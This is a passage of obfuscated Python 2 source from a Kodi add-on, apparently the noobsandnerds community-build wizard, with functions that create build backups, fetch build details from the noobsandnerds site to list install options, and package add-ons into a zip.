    if 97 - 97: o0oOOo0O0Ooo * O0 / o0oOOo0O0Ooo * OoO0O00 * Oo0Ooo
   else :
    OO0o . ok ( "Build Location" , 'Universal Backup:[CR][COLOR=dodgerblue]' + OooO00 + '[/COLOR]' )
    if 38 - 38: i1Ii11i1i
    if 25 - 25: iIii1I11I1II1 % II111iiii / OooO00OOoO00 / I1ii11iIi11i
def iI1iIIIIIiIi1 ( ) :
 IioOo0O ( )
 if 19 - 19: OoOoOO00 . o0oOOo0O0Ooo . OoooooooOO
 if os . path . exists ( ooOOoooooo ) :
  shutil . rmtree ( ooOOoooooo )
  if 13 - 13: Oo . Oo0Ooo / II111iiii
 iIiI1 = OO0o . yesno ( 'Create noobsandnerds Build' , 'This backup will only work if you share your build on the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] portal with the rest of the community. It will not work with any other installer/wizard, do you wish to continue?' )
 if 43 - 43: iIii1I11I1II1 % OoO0O00
 if iIiI1 == 1 :
  Ooo . create ( 'Checking File Structure' , '' , 'Please wait' , '' )
  if not os . path . exists ( O00O0oOO00O00 ) :
   os . makedirs ( O00O0oOO00O00 )
   if 84 - 84: Oo0Ooo
  OOOO00OOO00 = 1
  ii1OO0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , '' ) )
  OoOoO00OOoOOOo0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
  oOoO00O = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
  if 44 - 44: OoooooooOO * i11iIiiIii / Oo0Ooo
  if not os . path . exists ( ii1OO0 ) :
   os . makedirs ( ii1OO0 )
   if 75 - 75: OoooooooOO . Oo + OoO0O00 / OO000 - I1IiiI % OO000
  OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
  if 89 - 89: OOOOOOoo0O * iIii1I11I1II1 + i11iIiiIii . OoooooooOO
  if ( not OO000OOo ) :
   return False , 0
   if 51 - 51: Oo / o0oOOoo + OoO0O00 % OoOoOO00 / OO000
  O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
  OooO00 = xbmc . translatePath ( os . path . join ( ii1OO0 , O0Oo0O00o0oo0OO + '.zip' ) )
  if 25 - 25: o0oOOo0O0Ooo
  if 25 - 25: o0oOOoo * OOOOOOoo0O / OooO00OOoO00 / OooO00OOoO00 % o0oOOo0O0Ooo
  o0O00OoOOo = [ I1IiI ]
  iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
  ooo00o0o = [ I1IiI , 'cache' , 'system' , 'addons' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' , 'script.module.metahandler' , 'script.artistslideshow' , 'ArtistSlideshow' ]
  OOOO00o000o = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
  I1i11II11i1iI = "Creating full backup of existing build"
  o0ooooO0 = "Creating Community Build"
  iI1 = "Archiving..."
  I1I1i1i = ""
  OOo0O = "Please Wait"
  if 19 - 19: ooOo - iIii1I11I1II1 / o0oOOoo . OoO0O00 * O0 - O0
  if 41 - 41: i1IIi - I1IiiI
  if i1 == 'true' :
   IIiIiII ( O0o0Oo , OoOoO00OOoOOOo0 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
   if 48 - 48: I1IiiI - II111iiii / OoO0O00 + I1IiiI
  iIiI1 = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
  if 5 - 5: O0
  if 75 - 75: i1Ii11i1i + iIii1I11I1II1
  if iIiI1 == 0 :
   ooo00o0o = [ I1IiI , 'cache' , 'system' , 'addons' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
   if 19 - 19: I1IiiI + i11iIiiIii . oOO00 - OooO00OOoO00 / OO000 + o0oOOo0O0Ooo
  elif iIiI1 == 1 :
   pass
   if 38 - 38: Oo0Ooo / iIii1I11I1II1 * iIii1I11I1II1 % I1ii11iIi11i
   if 92 - 92: OooO00OOoO00 / O0 * I1IiiI - OooO00OOoO00
  oOo0Oo0O0O ( )
  I1iII1IIi1IiI ( O0o0Oo )
  IIiIiII ( O0o0Oo , OooO00 , o0ooooO0 , iI1 , I1I1i1i , OOo0O , ooo00o0o , OOOO00o000o )
  if 99 - 99: i11iIiiIii % OoooooooOO
  if 56 - 56: oOO00 * i1Ii11i1i
  try :
   os . remove ( II1I )
  except :
   pass
   if 98 - 98: OooO00OOoO00 + O0 * i1Ii11i1i + i11iIiiIii - Oo - iIii1I11I1II1
  try :
   os . remove ( ooOOoooooo )
  except :
   pass
   if 5 - 5: Oo % Oo0Ooo % oOO00 % o0oOOoo
  time . sleep ( 1 )
  if 17 - 17: OO000 + II111iiii + OoooooooOO / Oo / oOO00
  if 80 - 80: o0oOOo0O0Ooo % i1IIi / OooO00OOoO00
  oOOo0ooO0 = xbmc . translatePath ( os . path . join ( ii1OO0 , O0Oo0O00o0oo0OO + '_guisettings.zip' ) )
  if 56 - 56: i1IIi . i11iIiiIii
  try :
   shutil . copyfile ( O000OO0 , os . path . join ( O00O0oOO00O00 , 'guisettings.xml' ) )
   if I11 == 'true' :
    print "### Successfully copied guisettings to : " + os . path . join ( O00O0oOO00O00 , 'guisettings.xml' )
  except :
   if I11 == 'true' :
    print "### FAILED TO copy guisettings to : " + os . path . join ( O00O0oOO00O00 , 'guisettings.xml' )
   OOOO00OOO00 = 0
   if 15 - 15: II111iiii * ooOo % OOOOOOoo0O / i11iIiiIii - ooOo + Oo0Ooo
  try :
   shutil . copyfile ( xbmc . translatePath ( os . path . join ( O0o0Oo , 'userdata' , 'profiles.xml' ) ) , xbmc . translatePath ( os . path . join ( O00O0oOO00O00 , 'profiles.xml' ) ) )
   print "### Successfully copied profiles to : " + os . path . join ( O00O0oOO00O00 , 'profiles.xml' )
  except :
   pass
   if 9 - 9: OooO00OOoO00 - ooOo + O0 / OOOOOOoo0O % i1IIi
  oO000o0OO0OO0 = os . path . join ( O0O , 'script.skinshortcuts' )
  if os . path . exists ( oO000o0OO0OO0 ) :
   try :
    shutil . copytree ( os . path . join ( O0O , 'script.skinshortcuts' ) , os . path . join ( O00O0oOO00O00 , 'script.skinshortcuts' ) )
    if I11 == 'true' :
     print "### Successfully copied skinshortcuts to : " + os . path . join ( O00O0oOO00O00 , 'script.skinshortcuts' )
   except :
    OO0o . ok ( 'Failed to copy Skin Shortcuts' , 'There was an error trying to backup your script.skinshortcuts, please try again and if you continue to receive this message upload a log and send details to the noobsandnerds forum.' )
    if I11 == 'true' :
     print "### FAILED to copy skinshortcuts to: " + os . path . join ( O00O0oOO00O00 , 'script.skinshortcuts' )
     if 23 - 23: OOOOOOoo0O - OO000
  II11i1IiIII ( O00O0oOO00O00 , oOOo0ooO0 )
  if 16 - 16: Oo0Ooo % i1Ii11i1i
  if 10 - 10: oOO00 / OoooooooOO
  if 50 - 50: i11iIiiIii - OoooooooOO . ooOo + O0 . i1IIi
  if 91 - 91: o0oOOo0O0Ooo . OOOOOOoo0O % Oo0Ooo - OOOOOOoo0O . ooOo % i11iIiiIii
  if i1 == 'true' :
   II11i1IiIII ( O00O0oOO00O00 , oOoO00O )
   if 25 - 25: iIii1I11I1II1
   if 63 - 63: o0oOOoo
  if os . path . exists ( O00O0oOO00O00 ) :
   shutil . rmtree ( O00O0oOO00O00 )
   if 96 - 96: OooO00OOoO00
  if OOOO00OOO00 == 0 :
   OO0o . ok ( 'ERROR' , 'There was an error backing up your guisettings.xml, you cannot share a build without one so please try again. If this keeps happening please upload a log and contact the noobsandnerds forum with details.' )
   if 34 - 34: OoOoOO00 / OoO0O00 - I1IiiI . O0 . Oo
  else :
   OO0o . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 63 - 63: OOOOOOoo0O
   if i1 == 'true' :
    OO0o . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OoOoO00OOoOOOo0 , '[/COLOR]Universal Backup (this will ONLY work for sharing on the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] portal):[CR][COLOR=dodgerblue]' + OooO00 + '[/COLOR]' )
    if 11 - 11: OOOOOOoo0O - iIii1I11I1II1
   else :
    OO0o . ok ( "Build Location" , '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Backup (this will ONLY work for sharing on the Community Portal):[CR][COLOR=dodgerblue]' + OooO00 + '[/COLOR]' )
    if 92 - 92: OoO0O00
    if 15 - 15: oOO00 / oOO00 + iIii1I11I1II1 % OoooooooOO
def iIIi111IiII1i ( url , video ) :
 iIIiI11iI1Ii1 ( )
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/Community_Builds/community_builds_premium.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOo0O000oo0 = re . compile ( 'path="(.+?)"' ) . findall ( i11i1ii1I )
 II11I = re . compile ( 'myart="(.+?)"' ) . findall ( i11i1ii1I )
 Iii1iIiI1I1I1 = re . compile ( 'artpack="(.+?)"' ) . findall ( i11i1ii1I )
 I111i1i1111 = re . compile ( 'videopreview="(.+?)"' ) . findall ( i11i1ii1I )
 oOOO0OO = re . compile ( 'videoguide1="(.+?)"' ) . findall ( i11i1ii1I )
 I11ii1iI11 = re . compile ( 'videoguide2="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii111i1ii = re . compile ( 'videoguide3="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0O = re . compile ( 'videoguide4="(.+?)"' ) . findall ( i11i1ii1I )
 IiIiiI1ii111 = re . compile ( 'videoguide5="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii1 = re . compile ( 'videolabel1="(.+?)"' ) . findall ( i11i1ii1I )
 Ii111I11 = re . compile ( 'videolabel2="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0oo = re . compile ( 'videolabel3="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0 = re . compile ( 'videolabel4="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o0 = re . compile ( 'videolabel5="(.+?)"' ) . findall ( i11i1ii1I )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 ooO = re . compile ( 'author="(.+?)"' ) . findall ( i11i1ii1I )
 I1iI = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
 o0I1IIIi11ii11 = re . compile ( 'description="(.+?)"' ) . findall ( i11i1ii1I )
 oOoO0 = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( i11i1ii1I )
 Iii1II1ii = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( i11i1ii1I )
 ooOo00 = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( i11i1ii1I )
 OO0III = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( i11i1ii1I )
 iI1i11 = re . compile ( 'updated="(.+?)"' ) . findall ( i11i1ii1I )
 OoO0o = re . compile ( 'defaultskin="(.+?)"' ) . findall ( i11i1ii1I )
 OO0o0O0O0O0 = re . compile ( 'skins="(.+?)"' ) . findall ( i11i1ii1I )
 iI11IiIiiII1 = re . compile ( 'videoaddons="(.+?)"' ) . findall ( i11i1ii1I )
 I11iii1i = re . compile ( 'audioaddons="(.+?)"' ) . findall ( i11i1ii1I )
 ii1i1Iii = re . compile ( 'programaddons="(.+?)"' ) . findall ( i11i1ii1I )
 oO00oO00O0Oo = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( i11i1ii1I )
 OO0o0o0oo = re . compile ( 'sources="(.+?)"' ) . findall ( i11i1ii1I )
 iIiII1 = re . compile ( 'adult="(.+?)"' ) . findall ( i11i1ii1I )
 i111iii1I1 = re . compile ( 'guisettings="(.+?)"' ) . findall ( i11i1ii1I )
 iiIiII1ii111iI = re . compile ( 'thumb="(.+?)"' ) . findall ( i11i1ii1I )
 ii11I1 = re . compile ( 'fanart="(.+?)"' ) . findall ( i11i1ii1I )
 I1I = re . compile ( 'openelec="(.+?)"' ) . findall ( i11i1ii1I )
 if 76 - 76: I1IiiI
 ii1I1Ii1Ii = II11I [ 0 ] if ( len ( II11I ) > 0 ) else ''
 O0000 = Iii1iIiI1I1I1 [ 0 ] if ( len ( Iii1iIiI1I1I1 ) > 0 ) else ''
 i1iOO = oOo0O000oo0 [ 0 ] if ( len ( oOo0O000oo0 ) > 0 ) else ''
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 ii1i1II = ooO [ 0 ] if ( len ( ooO ) > 0 ) else ''
 iII1iii = I1iI [ 0 ] if ( len ( I1iI ) > 0 ) else ''
 IiIi11Iii = o0I1IIIi11ii11 [ 0 ] if ( len ( o0I1IIIi11ii11 ) > 0 ) else 'No information available'
 oOOo0oo0O = iI1i11 [ 0 ] if ( len ( iI1i11 ) > 0 ) else ''
 iiI1ii1IIiI = OoO0o [ 0 ] if ( len ( OoO0o ) > 0 ) else ''
 IIi1i1I11IIII = OO0o0O0O0O0 [ 0 ] if ( len ( OO0o0O0O0O0 ) > 0 ) else ''
 OooOoOOO00O = iI11IiIiiII1 [ 0 ] if ( len ( iI11IiIiiII1 ) > 0 ) else ''
 I111iIIII11iI = I11iii1i [ 0 ] if ( len ( I11iii1i ) > 0 ) else ''
 oOoOO = ii1i1Iii [ 0 ] if ( len ( ii1i1Iii ) > 0 ) else ''
 i11I1iIii1i11 = oO00oO00O0Oo [ 0 ] if ( len ( oO00oO00O0Oo ) > 0 ) else ''
 iIiiI11II11i = OO0o0o0oo [ 0 ] if ( len ( OO0o0o0oo ) > 0 ) else ''
 o00OoO0o0 = iIiII1 [ 0 ] if ( len ( iIiII1 ) > 0 ) else ''
 o0OOOoO0ooOOOo0 = i111iii1I1 [ 0 ] if ( len ( i111iii1I1 ) > 0 ) else 'None'
 o0oOOO = oOoO0 [ 0 ] if ( len ( oOoO0 ) > 0 ) else 'None'
 IIi11 = Iii1II1ii [ 0 ] if ( len ( Iii1II1ii ) > 0 ) else 'None'
 O0OOO = ooOo00 [ 0 ] if ( len ( ooOo00 ) > 0 ) else 'None'
 iii1iII1I = OO0III [ 0 ] if ( len ( OO0III ) > 0 ) else 'None'
 OoOo00o0OO = I111i1i1111 [ 0 ] if ( len ( I111i1i1111 ) > 0 ) else 'None'
 iI1IIIii = oOOO0OO [ 0 ] if ( len ( oOOO0OO ) > 0 ) else 'None'
 I1i11ii11 = I11ii1iI11 [ 0 ] if ( len ( I11ii1iI11 ) > 0 ) else 'None'
 OO00O0oOO = i11ii111i1ii [ 0 ] if ( len ( i11ii111i1ii ) > 0 ) else 'None'
 Ii1iI111 = Oo0O0O [ 0 ] if ( len ( Oo0O0O ) > 0 ) else 'None'
 O0oooo00o0Oo = IiIiiI1ii111 [ 0 ] if ( len ( IiIiiI1ii111 ) > 0 ) else 'None'
 IiIIi1 = i11ii1 [ 0 ] if ( len ( i11ii1 ) > 0 ) else 'None'
 iII11I1Ii1 = Ii111I11 [ 0 ] if ( len ( Ii111I11 ) > 0 ) else 'None'
 o0o0oOo0oO = Oo0O0oo [ 0 ] if ( len ( Oo0O0oo ) > 0 ) else 'None'
 IIi1IIIIi = o0O0 [ 0 ] if ( len ( o0O0 ) > 0 ) else 'None'
 OOOoO = oO0o0 [ 0 ] if ( len ( oO0o0 ) > 0 ) else 'None'
 oooO00o0 = iiIiII1ii111iI [ 0 ] if ( len ( iiIiII1ii111iI ) > 0 ) else 'None'
 o0o00oO0oo000 = ii11I1 [ 0 ] if ( len ( ii11I1 ) > 0 ) else 'None'
 i1Ii11ii = I1I [ 0 ] if ( len ( I1I ) > 0 ) else 'None'
 if 18 - 18: i11iIiiIii - o0oOOoo * ooOo + o0oOOo0O0Ooo
 iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'w+' )
 iiIi1I1i1 . write ( 'id="' + str ( video ) + '"\nname="' + oOo00O0oo00o0 + '"\nversion="' + iII1iii + '"' )
 iiIi1I1i1 . close ( )
 if 16 - 16: OoooooooOO * i11iIiiIii . OoooooooOO - iIii1I11I1II1 * i1IIi
 i1iI1IIi1I = open ( O0Oo000ooO00 , mode = 'r' )
 oo00i1i11I1I1 = i1iI1IIi1I . read ( )
 i1iI1IIi1I . close ( )
 if 82 - 82: OoO0O00 - Oo0Ooo - O0 - OoooooooOO
 Ii1iIi111i1i1 = re . compile ( 'id="(.+?)"' ) . findall ( oo00i1i11I1I1 )
 Ii1I1Iiii = Ii1iIi111i1i1 [ 0 ] if ( len ( Ii1iIi111i1i1 ) > 0 ) else 'None'
 oOIii = re . compile ( 'version="(.+?)"' ) . findall ( oo00i1i11I1I1 )
 iiIiII1 = oOIii [ 0 ] if ( len ( oOIii ) > 0 ) else 'None'
 i1IIIIiiI11 , I1iii1I , ooo = url . partition ( '&' )
 print "### Community Build Details:"
 print "### Name: " + oOo00O0oo00o0
 print "### URL: " + o0oOOO
 IiII111i1i11 ( '' , '[COLOR=yellow]IMPORTANT:[/COLOR] Install Instructions' , '' , 'instructions_2' , '' , '' , '' , '' )
 i1OOoO ( '[COLOR=yellow]Description:[/COLOR] This contains important info from the build author' , 'None' , 'description' , '' , o0o00oO0oo000 , oOo00O0oo00o0 , ii1i1II , iII1iii , IiIi11Iii , oOOo0oo0O , IIi1i1I11IIII , OooOoOOO00O , I111iIIII11iI , oOoOO , i11I1iIii1i11 , iIiiI11II11i , o00OoO0o0 )
 if 39 - 39: ooOo / o0oOOoo * II111iiii * OOOOOOoo0O
 if Ii1I1Iiii == i1IIIIiiI11 and iiIiII1 != iII1iii :
  IiII111i1i11 ( '' , '[COLOR=orange]----------------- UPDATE AVAILABLE ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  Ii1I1Ii ( '[COLOR=dodgerblue]1. Update:[/COLOR] Overwrite My Current Setup & Install New Build' , o0oOOO , 'restore_community' , oooO00o0 , '' , 'update' , oOo00O0oo00o0 , iiI1ii1IIiI , o0OOOoO0ooOOOo0 , O0000 )
  Ii1I1Ii ( '[COLOR=dodgerblue]2. Update:[/COLOR] Keep My Library & Profiles' , o0oOOO , 'restore_community' , oooO00o0 , '' , 'updatelibprofile' , oOo00O0oo00o0 , iiI1ii1IIiI , o0OOOoO0ooOOOo0 , O0000 )
  Ii1I1Ii ( '[COLOR=dodgerblue]3. Update:[/COLOR] Keep My Library Only' , o0oOOO , 'restore_community' , oooO00o0 , '' , 'updatelibrary' , oOo00O0oo00o0 , iiI1ii1IIiI , o0OOOoO0ooOOOo0 , O0000 )
  Ii1I1Ii ( '[COLOR=dodgerblue]4. Update:[/COLOR] Keep My Profiles Only' , o0oOOO , 'restore_community' , oooO00o0 , '' , 'updateprofiles' , oOo00O0oo00o0 , iiI1ii1IIiI , o0OOOoO0ooOOOo0 , O0000 )
  if 41 - 41: i11iIiiIii * O0 - OOOOOOoo0O . II111iiii % OoO0O00 % I1ii11iIi11i
 if OoOo00o0OO != 'None' or iI1IIIii != 'None' or I1i11ii11 != 'None' or OO00O0oOO != 'None' or Ii1iI111 != 'None' or O0oooo00o0Oo != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]------------------ VIDEO GUIDES -----------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 32 - 32: Oo + OOOOOOoo0O + iIii1I11I1II1 * Oo0Ooo
 if OoOo00o0OO != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] Preview[/COLOR]' , OoOo00o0OO , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 62 - 62: i11iIiiIii
 if iI1IIIii != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IiIIi1 + '[/COLOR]' , iI1IIIii , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 2 - 2: I1IiiI
 if I1i11ii11 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + iII11I1Ii1 + '[/COLOR]' , I1i11ii11 , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 69 - 69: OoooooooOO / Oo0Ooo * i1Ii11i1i
 if OO00O0oOO != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + o0o0oOo0oO + '[/COLOR]' , OO00O0oOO , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 99 - 99: II111iiii * iIii1I11I1II1 % O0 * ooOo / II111iiii % OoooooooOO
 if Ii1iI111 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IIi1IIIIi + '[/COLOR]' , Ii1iI111 , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 14 - 14: oOO00 . oOO00 % o0oOOoo
 if O0oooo00o0Oo != 'None' :
  IiII111i1i11 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + OOOoO + '[/COLOR]' , O0oooo00o0Oo , 'play_video' , '' , o0o00oO0oo000 , '' , '' )
  if 42 - 42: o0oOOo0O0Ooo . Oo - o0oOOoo
 if Ii1I1Iiii != i1IIIIiiI11 :
  IiII111i1i11 ( '' , '[COLOR=orange]------------------ INSTALL OPTIONS ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 33 - 33: II111iiii / O0 / oOO00 - OooO00OOoO00 - i1IIi
 if o0oOOO == 'None' :
  Ii1I1Ii ( '[COLOR=orange]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
  if 8 - 8: i11iIiiIii . OOOOOOoo0O / iIii1I11I1II1 / I1ii11iIi11i / oOO00 - OO000
 if Ii1I1Iiii != i1IIIIiiI11 :
  if IioO0O ( ) and i1Ii11ii != 'None' :
   if 32 - 32: o0oOOo0O0Ooo . i1IIi * Oo0Ooo
   Ii1I1Ii ( '[COLOR=darkcyan]OpenELEC FRESH INSTALL[/COLOR]' , i1Ii11ii , 'restore_openelec' , oooO00o0 , o0o00oO0oo000 , o0OOOoO0ooOOOo0 , oOo00O0oo00o0 , '' , '' , '' )
   if 98 - 98: OO000 - II111iiii / I1IiiI . ooOo * oOO00 . OooO00OOoO00
   if 25 - 25: i11iIiiIii / OoOoOO00 - i1Ii11i1i / OoO0O00 . o0oOOo0O0Ooo . o0oOOo0O0Ooo
  Ii1I1Ii ( '[COLOR=dodgerblue]Standard Install[/COLOR]' , o0oOOO , 'restore_community' , oooO00o0 , o0o00oO0oo000 , 'merge' , oOo00O0oo00o0 , iiI1ii1IIiI , o0OOOoO0ooOOOo0 , O0000 )
  if 6 - 6: ooOo . OooO00OOoO00
  if 43 - 43: I1ii11iIi11i + o0oOOo0O0Ooo
  if 50 - 50: ooOo % i1IIi * O0
  if 4 - 4: iIii1I11I1II1 . i1IIi
 if o0OOOoO0ooOOOo0 != 'None' :
  if 63 - 63: iIii1I11I1II1 + oOO00 % i1IIi / I1IiiI % II111iiii
  IiII111i1i11 ( '' , '[COLOR=dodgerblue](Optional) Apply guisettings.xml fix[/COLOR]' , o0OOOoO0ooOOOo0 , 'guisettingsfix' , '' , o0o00oO0oo000 , '' , '' )
  if 60 - 60: o0oOOo0O0Ooo . OoOoOO00 % i1Ii11i1i / I1IiiI / O0
  if 19 - 19: i11iIiiIii . I1IiiI + II111iiii / Oo . I1ii11iIi11i * o0oOOoo
def oo0OOoooo0O0 ( url ) :
 if 99 - 99: Oo0Ooo + i11iIiiIii
 OooOooO0O0o0 = ''
 if url == 'create_pack' :
  OooOooO0O0o0 = o0OO0o0o00o ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' )
  I111Ii11i11I = xbmcgui . Dialog ( ) . browse ( 3 , 'Select the folder you want to store this file in' , 'files' , '' , False , False )
  OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this keyword" )
  if 15 - 15: OooO00OOoO00 / Oo0Ooo * OooO00OOoO00
  if ( not OO000OOo ) :
   return False , 0
   if 20 - 20: o0oOOoo - Oo * OoO0O00 * o0oOOo0O0Ooo * Oo / oOO00
  O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 Ooo . create ( 'Backing Up Addons & Repositories' , '' , 'Please Wait...' )
 if 40 - 40: I1IiiI * o0oOOo0O0Ooo . I1IiiI
 if not os . path . exists ( ooOOoooooo ) :
  os . makedirs ( ooOOoooooo )
  if 62 - 62: o0oOOoo + II111iiii % o0oOOoo
  if 50 - 50: OoooooooOO + ooOo * I1IiiI - OO000 / i11iIiiIii
 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) :
  if not 'metadata' in oOo00O0oo00o0 and not 'module' in oOo00O0oo00o0 and not 'script.common' in oOo00O0oo00o0 and not 'packages' in oOo00O0oo00o0 and not 'service.xbmc.versioncheck' in oOo00O0oo00o0 and os . path . isdir ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
   try :
    Ooo . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % oOo00O0oo00o0 , 'Please Wait...' )
    if 5 - 5: O0 - I1IiiI
    if 44 - 44: II111iiii . II111iiii + Oo * OO000
    if oOo00O0oo00o0 in OooOooO0O0o0 or url != 'create_pack' :
     if 16 - 16: II111iiii
     if not os . path . exists ( os . path . join ( ooOOoooooo , 'addons' , oOo00O0oo00o0 ) ) :
      os . makedirs ( os . path . join ( ooOOoooooo , 'addons' , oOo00O0oo00o0 ) )
     shutil . copyfile ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 , 'addon.xml' ) , os . path . join ( ooOOoooooo , 'addons' , oOo00O0oo00o0 , 'addon.xml' ) )
    if not oOo00O0oo00o0 in OooOooO0O0o0 :
     shutil . copytree ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) , os . path . join ( ooOOoooooo , 'addons' , oOo00O0oo00o0 ) )
     if 100 - 100: O0 - i1IIi
    iII1iiiiI1i = os . path . join ( ooOOoooooo , 'addons' , oOo00O0oo00o0 , 'addon.xml' )
    if 58 - 58: iIii1I11I1II1 / I1IiiI - I1ii11iIi11i . o0oOOo0O0Ooo - Oo0Ooo
    if 88 - 88: OoO0O00 . i1Ii11i1i / OooO00OOoO00
    if 47 - 47: OoO0O00 + I1ii11iIi11i . o0oOOoo
    IiiIiIIi1 = open ( iII1iiiiI1i , mode = 'r' )
    IiiI = IiiIiIIi1 . read ( )
    IiiIiIIi1 . close ( )
    if 40 - 40: OOOOOOoo0O . OoOoOO00 * O0
    if 6 - 6: I1IiiI - II111iiii . I1IiiI + OooO00OOoO00 . Oo
    ooooo0Oo0 = re . compile ( '<addon[\s\S]*?">' ) . findall ( IiiI )
    O0o0oo0oOO0oO = ooooo0Oo0 [ 0 ] if ( len ( ooooo0Oo0 ) > 0 ) else 'None'
    oo0OIii1iI1iiIii = re . compile ( 'version="[\s\S]*?"' ) . findall ( O0o0oo0oOO0oO )
    iIiiI111I11 = oo0OIii1iI1iiIii [ 0 ] if ( len ( oo0OIii1iI1iiIii ) > 0 ) else '0'
    if 86 - 86: ooOo + OOOOOOoo0O / OoooooooOO - OooO00OOoO00
    if 55 - 55: Oo / OoOoOO00 * Oo
    III = str ( O0o0oo0oOO0oO ) . replace ( iIiiI111I11 , 'version="0.0.0.1"' )
    iiiI1i11Ii = IiiI . replace ( O0o0oo0oOO0oO , III )
    if 3 - 3: i11iIiiIii - ooOo / oOO00
    OO0oOOo0o = open ( iII1iiiiI1i , mode = 'w' )
    OO0oOOo0o . write ( str ( iiiI1i11Ii ) )
    OO0oOOo0o . close ( )
    if 62 - 62: i1Ii11i1i
   except :
    if I11 == 'true' :
     print "### Failed to create: " + oOo00O0oo00o0 + ' ###'
     if 97 - 97: II111iiii % Oo0Ooo * oOO00
 if url == 'create_pack' :
  ooo00o0o = [ '.svn' , '.git' ]
  OOOO00o000o = [ '.DS_Store' , 'Thumbs.db' , '.gitignore' ]
  oOoOO0O00o = os . path . join ( I111Ii11i11I , O0Oo0O00o0oo0OO + '.zip' )
  IIiIiII ( ooOOoooooo , oOoOO0O00o , 'Creating Addons Archive' , '' , '' , '' , ooo00o0o , OOOO00o000o )
  try :
   shutil . rmtree ( ooOOoooooo )
  except :
   pass
  OO0o . ok ( 'New Keyword Created' , 'Please read the instructions on how to share this keyword with the community. Your zip file can be found at:' , '[COLOR=dodgerblue]' + oOoOO0O00o + '[/COLOR]' )
  if 77 - 77: i1Ii11i1i + ooOo
  if 38 - 38: I1ii11iIi11i - OO000 * o0oOOo0O0Ooo
def iIIIi1iii1I11 ( name ) :
 if 81 - 81: oOO00 / oOO00 / OoO0O00 % ooOo . iIii1I11I1II1
 iiIi1I1i1 = open ( O0Oo000ooO00 , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 OoO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( IiiI )
 Ii1I1I = OoO0Ooo [ 0 ] if ( len ( OoO0Ooo ) > 0 ) else 'None'
